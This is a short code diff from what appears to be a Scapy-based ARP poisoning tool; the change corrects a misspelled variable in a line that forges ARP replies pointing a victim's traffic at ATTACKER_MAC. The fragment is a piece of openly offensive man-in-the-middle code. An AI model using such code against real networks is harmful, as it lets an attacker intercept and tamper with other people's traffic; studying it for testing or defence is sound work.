@@ -112,7 +112,7 @@ def arp_poison(targets, gateways):
                     arp[ARP].op = 1
                     sendp(arp, iface=options.iface, verbose=options.verbose)
                     if(not options.oneway):
-                        arpM = forge_arp(vitcim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
+                        arpM = forge_arp(victim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
                         sendp(arpM, iface=options.iface, verbose=options.verbose)
 
                         arpM[ARP].op = 1
